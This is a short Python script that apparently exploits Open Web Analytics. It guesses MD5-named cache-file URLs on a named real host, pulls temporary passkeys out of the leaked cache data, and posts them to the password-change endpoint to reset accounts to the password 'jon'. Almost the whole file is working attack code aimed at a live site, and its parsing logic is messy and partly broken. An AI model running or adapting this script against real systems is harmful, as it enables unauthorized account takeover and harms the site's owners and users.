import string
import hashlib
import requests
import os
import base64
import json
import re

os.chdir('/sdcard')

for key in range(100):
  
  base_url='https://owa.communovation.com/'
  user_id = 'user_id' + str(key)
  userid_hash = hashlib.md5(user_id.encode()).hexdigest() 
  filename = userid_hash + '.php'
  filename = userid_hash + '.php'
  cache_url = base_url + "owa-data/caches/" + str(key) + "/owa_user/" + filename
  cache = requests.get(cache_url)
  v = str(cache.status_code)
  if v == '200':
  	vx = str(cache.text)
  	sd = vx.replace('*' , '  *')
  	yum = sd.replace('*' ,'')
  	varane = yum.split()
  	messi = open('booba.txt' , 'r')
  	var = str(messi.read())
  	
  	re = var.replace("temp_passkey" , "         \n\ntemp_passkey")
  	cv = re.replace('data_type' , '   \n\ndata_type')
  	cvv = str(cv)
  	cx = open('doc.txt' , 'r')
  	for xxx in cx :
  		if 'temp' in xxx:
  			doc = xxx.replace(':', '  :')
  			vh = doc.split()
  			nc = (vh[10].replace(':', ''))
  			ncc = (nc.replace('"', ''))
  			pas = (ncc.replace(';s', ''))
  			
  			data = {
  			"owa_password": 'jon' ,
  			"owa_password2": 'jon',
  			"owa_k": pas,
  			"owa_action": 
  			"base.usersChangePassword"
  			}
  			
  			password = base_url + "index.php?owa_do=base.usersPasswordEntry"
  			req = requests.post(password, data=data)
  			print(req.url)
   
     	